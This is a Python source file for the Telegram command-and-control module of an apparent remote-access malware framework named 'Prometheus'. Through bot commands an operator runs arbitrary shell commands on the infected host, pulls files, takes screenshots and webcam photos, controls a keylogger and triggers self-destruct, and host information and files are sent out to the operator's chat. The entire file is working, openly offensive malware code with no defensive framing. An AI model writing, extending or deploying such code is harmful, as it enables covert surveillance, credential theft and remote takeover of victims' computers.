# core/c2_telegram.py
"""
Telegram C2 Backend - Full Implementation
"""

import os
import json
import time
import threading
import logging
from typing import Dict, Any, Optional, List, Callable
from datetime import datetime

try:
    from telegram import Bot, Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    import asyncio
except ImportError:
    raise ImportError("python-telegram-bot required: pip install python-telegram-bot")

from .c2_interface import C2Backend, C2Message, MessageType


class TelegramBackend(C2Backend):
    """Telegram-based C2 backend."""

    def __init__(
        self,
        bot_token: str,
        chat_id: str,
        allowed_chat_ids: List[str] = None,
        use_threading: bool = True
    ):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.allowed_chat_ids = allowed_chat_ids or [chat_id]
        self.use_threading = use_threading

        self.bot: Optional[Bot] = None
        self.application: Optional[Application] = None
        self._running = False
        self._message_queue: List[C2Message] = []
        self._logger = logging.getLogger(__name__)

    def initialize(self) -> bool:
        try:
            self.bot = Bot(token=self.bot_token)
            self.application = Application.builder().token(self.bot_token).build()
            self._register_handlers()

            if self.use_threading:
                self._start_polling_thread()
            else:
                self._running = True
                asyncio.run(self.application.run_polling())

            return True
        except Exception as e:
            self._logger.error(f"Telegram init failed: {e}")
            return False

    def _register_handlers(self):
        if not self.application:
            return
        self.application.add_handler(CommandHandler("start", self._handle_start))
        self.application.add_handler(CommandHandler("status", self._handle_status))
        self.application.add_handler(CommandHandler("shell", self._handle_shell))
        self.application.add_handler(CommandHandler("download", self._handle_download))
        self.application.add_handler(CommandHandler("screenshot", self._handle_screenshot))
        self.application.add_handler(CommandHandler("keylog", self._handle_keylog))
        self.application.add_handler(CommandHandler("webcam", self._handle_webcam))
        self.application.add_handler(CommandHandler("kill", self._handle_kill))
        self.application.add_handler(CommandHandler("help", self._handle_help))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self._handle_message))
        self.application.add_error_handler(self._handle_error)

    def _start_polling_thread(self):
        def poll_loop():
            self._running = True
            try:
                asyncio.run(self.application.run_polling())
            except Exception as e:
                self._logger.error(f"Polling error: {e}")
            finally:
                self._running = False
        thread = threading.Thread(target=poll_loop, daemon=True)
        thread.start()
        time.sleep(2)

    def send_message(self, message: C2Message) -> bool:
        if not self.bot:
            return False
        try:
            content = message.content
            if isinstance(content, dict):
                content = json.dumps(content, indent=2)
            formatted = self._format_message(message.type, content)
            self.bot.send_message(chat_id=self.chat_id, text=formatted, parse_mode="HTML")
            return True
        except Exception as e:
            self._logger.error(f"Send failed: {e}")
            return False

    def send_file(self, file_path: str, filename: str = None) -> bool:
        if not self.bot:
            return False
        try:
            if not os.path.exists(file_path):
                return False
            with open(file_path, "rb") as f:
                self.bot.send_document(
                    chat_id=self.chat_id,
                    document=f,
                    filename=filename or os.path.basename(file_path)
                )
            return True
        except Exception as e:
            self._logger.error(f"Send file failed: {e}")
            return False

    def receive_messages(self, timeout: int = 30) -> List[C2Message]:
        messages = []
        if self._message_queue:
            messages = self._message_queue.copy()
            self._message_queue.clear()
        return messages

    def is_connected(self) -> bool:
        return self._running and self.bot is not None

    def close(self):
        self._running = False
        if self.application:
            try:
                self.application.shutdown()
            except Exception:
                pass

    def _format_message(self, msg_type: MessageType, content: str) -> str:
        icons = {
            MessageType.STATUS: "📊",
            MessageType.DATA: "📦",
            MessageType.FILE: "📎",
            MessageType.COMMAND: "⚡",
            MessageType.RESPONSE: "✅",
            MessageType.ERROR: "❌",
        }
        icon = icons.get(msg_type, "📝")
        return f"<b>{icon}</b>\n\n<code>{content}</code>"

    # --- Command Handlers ---

    async def _handle_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        msg = (
            "🔐 <b>Prometheus Framework</b>\n\n"
            "Commands:\n"
            "/status - System info\n"
            "/shell <cmd> - Execute command\n"
            "/download <path> - Download file\n"
            "/screenshot - Take screenshot\n"
            "/keylog start|stop|dump - Keylogger\n"
            "/webcam - Take webcam photo\n"
            "/kill - Self-destruct\n"
            "/help - This help"
        )
        await update.message.reply_text(msg, parse_mode="HTML")

    async def _handle_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        import platform, psutil, socket
        msg = (
            f"🖥️ <b>System Status</b>\n\n"
            f"Hostname: {socket.gethostname()}\n"
            f"OS: {platform.system()} {platform.release()}\n"
            f"CPU: {psutil.cpu_count()} cores\n"
            f"RAM: {psutil.virtual_memory().total / (1024**3):.1f} GB\n"
            f"Disk: {psutil.disk_usage('/').free / (1024**3):.1f} GB free"
        )
        await update.message.reply_text(msg, parse_mode="HTML")

    async def _handle_shell(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        if not context.args:
            await update.message.reply_text("Usage: /shell <command>")
            return
        command = " ".join(context.args)
        await update.message.reply_text(f"⚡ Executing: {command}")

        def execute():
            import subprocess
            try:
                result = subprocess.run(command, shell=True, capture_output=True, timeout=30, text=True)
                output = result.stdout or result.stderr or "No output"
            except Exception as e:
                output = str(e)
            self._message_queue.append(C2Message(
                type=MessageType.RESPONSE,
                content=output[:4000],
                metadata={"command": "shell"}
            ))

        threading.Thread(target=execute, daemon=True).start()
        await update.message.reply_text("✅ Command sent. Response follows.")

    async def _handle_download(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        if not context.args:
            await update.message.reply_text("Usage: /download <file_path>")
            return
        file_path = " ".join(context.args)
        await update.message.reply_text(f"📎 Requesting: {file_path}")
        self._message_queue.append(C2Message(
            type=MessageType.COMMAND,
            content=f"DOWNLOAD:{file_path}",
            metadata={"command": "download", "file_path": file_path}
        ))

    async def _handle_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        await update.message.reply_text("📷 Capturing screenshot...")
        self._message_queue.append(C2Message(
            type=MessageType.COMMAND,
            content="SCREENSHOT",
            metadata={"command": "screenshot"}
        ))

    async def _handle_keylog(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        if not context.args or context.args[0] not in ["start", "stop", "dump"]:
            await update.message.reply_text("Usage: /keylog start|stop|dump")
            return
        action = context.args[0]
        await update.message.reply_text(f"⌨️ Keylogger {action} command sent")
        self._message_queue.append(C2Message(
            type=MessageType.COMMAND,
            content=f"KEYLOG:{action}",
            metadata={"command": "keylog", "action": action}
        ))

    async def _handle_webcam(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        await update.message.reply_text("📸 Capturing webcam...")
        self._message_queue.append(C2Message(
            type=MessageType.COMMAND,
            content="WEBCAM",
            metadata={"command": "webcam"}
        ))

    async def _handle_kill(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        await update.message.reply_text("💀 Self-destruct initiated.")
        self._message_queue.append(C2Message(
            type=MessageType.COMMAND,
            content="KILL",
            metadata={"command": "kill"}
        ))

    async def _handle_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        help_text = (
            "🤖 <b>Prometheus Commands</b>\n\n"
            "/status - System info\n"
            "/shell &lt;cmd&gt; - Execute shell command\n"
            "/download &lt;path&gt; - Download file\n"
            "/screenshot - Take screenshot\n"
            "/keylog start|stop|dump - Keylogger\n"
            "/webcam - Take webcam photo\n"
            "/kill - Self-destruct\n"
            "/help - This help"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")

    async def _handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._check_auth(update):
            return
        if update.message and update.message.text:
            self._message_queue.append(C2Message(
                type=MessageType.COMMAND,
                content=update.message.text,
                metadata={"chat_id": update.effective_chat.id}
            ))

    async def _handle_error(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self._logger.error(f"Telegram error: {context.error}")

    def _check_auth(self, update: Update) -> bool:
        chat_id = str(update.effective_chat.id) if update.effective_chat else None
        return chat_id in self.allowed_chat_ids
